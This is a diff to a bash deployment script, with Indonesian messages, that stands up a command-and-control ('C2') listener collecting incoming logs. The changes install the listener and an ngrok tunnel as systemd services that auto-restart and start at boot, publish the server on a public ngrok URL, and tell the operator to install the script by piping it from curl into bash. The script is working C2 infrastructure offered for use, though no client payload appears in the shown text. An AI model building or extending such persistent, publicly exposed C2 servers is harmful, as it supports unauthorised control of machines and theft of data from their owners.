@@ -1,11 +1,10 @@
 set -e
 
-PORT=8080
+PORT="${C2_PORT:-${PORT:-8080}}"
 LOG_DIR="./received_logs"
 SCRIPT_NAME="c2_listener.py"
 SERVER_LOG="c2_server.log"
 NGROK_AUTH_TOKEN="${NGROK_AUTH_TOKEN:-}"
-NGROK_PORT="${NGROK_PORT:-8080}"
 
 if [ "$(id -u)" -eq 0 ]; then
     SUDO=""
@@ -439,7 +438,12 @@ open_port() {
 }
 open_port
 
-setup_ngrok() {
+LISTENER_MODE="nohup"
+if command -v systemctl > /dev/null 2>&1; then
+    LISTENER_MODE="systemd"
+fi
+
+ensure_ngrok() {
     if ! command -v ngrok > /dev/null 2>&1; then
         echo " [*] ngrok belum terpasang..."
         if command -v apt-get > /dev/null 2>&1; then
@@ -453,31 +457,112 @@ setup_ngrok() {
         fi
     fi
 
-    HAS_TOKEN=0
     if [ -n "$NGROK_AUTH_TOKEN" ]; then
         ngrok config add-authtoken "$NGROK_AUTH_TOKEN" > /dev/null 2>&1 || true
-        HAS_TOKEN=1
-    elif command -v ngrok > /dev/null 2>&1 && ngrok config check > /dev/null 2>&1; then
-        HAS_TOKEN=1
-    fi
-
-    if [ "$HAS_TOKEN" -eq 0 ]; then
-        echo " [!] Authtoken ngrok belum ada. Salah satu cara:"
-        echo "     1) Sekali saja di server:  ngrok config add-authtoken TOKEN_ANDA"
-        echo "        (lalu curl | bash polos langsung pakai ngrok)"
-        echo "     2) Atau setiap run:         curl -fsSL URL | NGROK_AUTH_TOKEN=TOKEN_ANDA bash"
         return 0
     fi
+    if command -v ngrok > /dev/null 2>&1 && ngrok config check > /dev/null 2>&1; then
+        return 0
+    fi
+    echo " [!] Authtoken ngrok belum ada. Salah satu cara:"
+    echo "     1) Sekali saja di server:  ngrok config add-authtoken TOKEN_ANDA"
+    echo "        (lalu curl | bash polos langsung pakai ngrok)"
+    echo "     2) Atau setiap run:         curl -fsSL URL | NGROK_AUTH_TOKEN=TOKEN_ANDA bash"
+    return 1
+}
 
-    echo " [*] Menghentikan tunnel ngrok lama (jika ada)..."
-    pkill -f "ngrok http" 2>/dev/null || true
-    sleep 1
+start_services() {
+    local DO_NGROK="$1"
+    if [ "$LISTENER_MODE" = "systemd" ]; then
+        echo " [*] Memasang systemd service (auto-restart, nyala otomatis saat boot)..."
+        local PY; PY=$(command -v python3)
+        local CWD; CWD=$(pwd)
+        local SU="$USER"; [ -n "$SUDO_USER" ] && SU="$SUDO_USER"
+        local UL=""; [ "$SU" != "root" ] && UL="User=${SU}"
+        local NG; NG=$(command -v ngrok)
 
-    echo " [*] Starting ngrok tunnel -> localhost:$NGROK_PORT ..."
-    nohup ngrok http "$NGROK_PORT" --log=stdout > ngrok.log 2>&1 &
-    NGROK_PID=$!
-    sleep 4
+        $SUDO pkill -f "$SCRIPT_NAME" 2>/dev/null || true
+        $SUDO pkill -f "ngrok http" 2>/dev/null || true
+        sleep 1
+
+        $SUDO tee /etc/systemd/system/c2-listener.service > /dev/null <<EOSVC
+[Unit]
+Description=C2 Listener
+After=network.target
+
+[Service]
+${UL}
+WorkingDirectory=${CWD}
+ExecStart=${PY} -u ${CWD}/${SCRIPT_NAME}
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOSVC
+
+        if [ "$DO_NGROK" = "1" ]; then
+            $SUDO tee /etc/systemd/system/c2-ngrok.service > /dev/null <<EOSVC
+[Unit]
+Description=C2 ngrok tunnel
+After=network.target
+
+[Service]
+${UL}
+ExecStart=${NG} http ${PORT} --log=stdout
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOSVC
+            $SUDO systemctl enable c2-ngrok > /dev/null 2>&1 || true
+        else
+            $SUDO systemctl disable c2-ngrok > /dev/null 2>&1 || true
+        fi
+
+        $SUDO systemctl daemon-reload
+        $SUDO systemctl enable c2-listener > /dev/null 2>&1 || true
+        $SUDO systemctl restart c2-listener 2>/dev/null || true
+        [ "$DO_NGROK" = "1" ] && $SUDO systemctl restart c2-ngrok 2>/dev/null || true
+        sleep 3
+        echo " [+] systemd c2-listener : $($SUDO systemctl is-active c2-listener 2>/dev/null || echo unknown)"
+        if [ "$DO_NGROK" = "1" ]; then
+            echo " [+] systemd c2-ngrok    : $($SUDO systemctl is-active c2-ngrok 2>/dev/null || echo unknown)"
+        fi
+        echo "     Kelola: sudo systemctl status c2-listener | restart | stop"
+        echo "     Log   : journalctl -u c2-listener -f"
+    else
+        echo " [*] Menghentikan proses lama (jika ada)..."
+        pkill -f "$SCRIPT_NAME" 2>/dev/null || true
+        pkill -f "ngrok http" 2>/dev/null || true
+        sleep 1
+
+        echo " [*] Starting C2 listener on port $PORT in background..."
+        nohup python3 -u "$SCRIPT_NAME" >> "$SERVER_LOG" 2>&1 &
+        LISTENER_PID=$!
+        sleep 2
+        if kill -0 "$LISTENER_PID" 2>/dev/null; then
+            echo " [+] Listener berjalan (PID $LISTENER_PID)."
+            echo " [+] Log server : $SERVER_LOG"
+            echo " [+] Live log   : tail -f $SERVER_LOG"
+            echo " [+] Stop       : pkill -f $SCRIPT_NAME"
+        else
+            echo " [!] Listener gagal start, cek log: $SERVER_LOG"
+            tail -5 "$SERVER_LOG" 2>/dev/null || true
+        fi
+
+        if [ "$DO_NGROK" = "1" ]; then
+            echo " [*] Starting ngrok tunnel -> localhost:$PORT ..."
+            nohup ngrok http "$PORT" --log=stdout > ngrok.log 2>&1 &
+            NGROK_PID=$!
+        fi
+    fi
+}
+
+fetch_ngrok_url() {
     NGROK_URL=""
+    sleep 4
     for i in 1 2 3 4 5 6; do
         NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | python3 -c "import sys,json;print(json.load(sys.stdin)['tunnels'][0]['public_url'])" 2>/dev/null || true)
         if [ -n "$NGROK_URL" ]; then
@@ -486,11 +571,14 @@ setup_ngrok() {
         sleep 2
     done
     if [ -n "$NGROK_URL" ]; then
-        echo " [+] Ngrok tunnel berjalan (PID $NGROK_PID): $NGROK_URL"
+        echo " [+] Ngrok tunnel berjalan: $NGROK_URL"
     else
-        echo " [!] Ngrok tidak menghasilkan public URL. Error terakhir:"
-        tail -3 ngrok.log 2>/dev/null || true
-        echo " [!] Cek penuh: tail -f ngrok.log"
+        echo " [!] Ngrok tidak menghasilkan public URL."
+        if [ -f ngrok.log ]; then
+            echo "     Error terakhir:"
+            tail -3 ngrok.log 2>/dev/null || true
+        fi
+        echo "     Untuk systemd, cek: journalctl -u c2-ngrok -n 20"
     fi
 }
 
@@ -533,32 +621,20 @@ if [ -n "$TS_IP" ]; then
     echo "     (via Tailscale: http://${TS_IP}:${PORT}/dashboard)"
 fi
 echo ""
-echo " [3] Start listener again later with:"
-echo "     python3 -u $SCRIPT_NAME"
+echo " [3] Restart semua service (systemd):  sudo systemctl restart c2-listener c2-ngrok"
+echo "     (tanpa systemd: python3 -u $SCRIPT_NAME)"
 echo ""
 echo " [4] Jika server adalah VM cloud, buka port $PORT di security group."
 echo "=================================================================="
 
-echo " [*] Menghentikan listener lama (jika ada)..."
-pkill -f "$SCRIPT_NAME" 2>/dev/null || true
-sleep 1
-
-echo " [*] Starting C2 listener on port $PORT in background..."
-nohup python3 -u "$SCRIPT_NAME" >> "$SERVER_LOG" 2>&1 &
-LISTENER_PID=$!
-sleep 2
-if kill -0 "$LISTENER_PID" 2>/dev/null; then
-    echo " [+] Listener berjalan (PID $LISTENER_PID)."
-    echo " [+] Log server : $SERVER_LOG"
-    echo " [+] Live log   : tail -f $SERVER_LOG"
-    echo " [+] Stop       : pkill -f $SCRIPT_NAME"
-else
-    echo " [!] Listener gagal start, cek log: $SERVER_LOG"
-    tail -5 "$SERVER_LOG" 2>/dev/null || true
-fi
-
 NGROK_URL=""
-setup_ngrok
+if ensure_ngrok; then
+    start_services "1"
+    fetch_ngrok_url
+else
+    echo " [*] Listener tetap jalan (tanpa ngrok) sampai token diberikan..."
+    start_services "0"
+fi
 
 echo ""
 echo "=================================================================="
